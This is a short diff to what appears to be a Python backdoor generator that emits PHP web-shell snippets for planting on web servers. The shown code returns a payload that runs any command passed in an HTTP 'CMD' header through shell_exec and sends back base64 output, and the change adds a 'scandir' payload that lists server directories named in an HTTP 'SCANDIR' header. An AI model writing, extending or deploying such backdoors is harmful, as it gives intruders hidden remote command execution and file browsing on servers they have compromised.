@@ -25,13 +25,15 @@ def generate_backdoor(option):
 		return 'function f_system($cmd){if(isset($cmd) && $cmd!=""){$var=shell_exec($cmd." 2>&1");return base64_encode($var);}} if(isset($_SERVER["HTTP_CMD"])){$msg=f_system($_SERVER["HTTP_CMD"]);}'
 	if(option=="shell_nosystem"):
 		return "echo 'WTF';"
+	if(option=="scandir"):
+		return 'function scan_dir($path){return base64_encode(implode(scandir($path),"\r\n"));} if(isset($_SERVER["HTTP_SCANDIR"])){$msg=scan_dir($_SERVER["HTTP_SCANDIR"]);}'
 
 #Let's write our backdoor ! 
 backdoor=""
 
 
 
-supported_stuff=['shell_system','shell_nosystem']
+supported_stuff=['shell_system','shell_nosystem','scandir']
 
 if(args.stuff):
 	options=args.stuff.split(',')
